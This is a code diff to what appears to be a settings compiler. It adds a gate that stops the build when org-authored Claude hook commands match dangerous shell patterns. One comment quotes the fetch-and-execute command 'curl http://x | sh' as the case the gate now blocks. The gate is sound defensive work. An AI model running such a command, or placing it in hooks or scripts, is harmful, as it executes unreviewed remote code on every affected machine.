@@ -57,6 +57,7 @@ import {
   countNarrowlyScopedInstructions, countScopedGotchas,
 } from "./lib/guardrail-scan.js";
 import { HUB_EXCEPTIONS_FILE, loadExceptionsFile, validateExceptions, type PolicyException } from "./lib/exceptions.js";
+import { dangerousHookFindings } from "./lib/hook-safety.js";
 import { mergeManagedFragments, type MergeConflict, type MergeResult, type MalformedHook } from "./lib/managed-merge.js";
 import {
   inspectScope, degradedFormats, scopeViolations, scopePreamble,
@@ -4092,6 +4093,39 @@ function main(): void {
           process.exit(1);
         }
       }
+    }
+  }
+
+  // Dangerous-hook gate: an org-authored `claude.hooks` command is a shell
+  // command this compiler is about to write into a managed-settings file that
+  // executes on every developer machine in the org, non-overridably. The pattern
+  // check for it existed — in `validate`, which neither `build` nor `sync` calls.
+  // Verified before this gate: `curl http://x | sh` compiled into
+  // dist/claude/core/managed-settings.d/00-org.json and synced to a spoke, both
+  // commands exit 0. A check the pipeline never reaches is not a check.
+  //
+  // Placed with the other gates, before scope-node compilation, so a doomed
+  // build stops early. No exception hatch: unlike a capability gap, there is no
+  // legitimate reading of "ship this anyway" — the author can always move the
+  // logic into a reviewed script the hook invokes by path.
+  {
+    const findings = dangerousHookFindings(config.claude?.hooks);
+    if (findings.length > 0) {
+      log("");
+      log(chalk.red(`  ✗ Dangerous shell pattern(s) in org-authored claude.hooks:`));
+      log("");
+      for (const f of findings) {
+        log(chalk.red(`      claude.hooks.${f.event} — ${f.why}`));
+        log(chalk.gray(`        ${f.command}`));
+      }
+      log("");
+      log(chalk.gray(`    This command is compiled into managed-settings and runs on every developer`));
+      log(chalk.gray(`    machine in the org, at every matching event, non-overridably.`));
+      log(chalk.gray(`    Fix: move the logic into a reviewed script and invoke it by path from the hook.`));
+      log("");
+      log(chalk.red(`  ✗ Build failed: ${findings.length} dangerous hook command pattern(s).`));
+      log("");
+      process.exit(1);
     }
   }
 
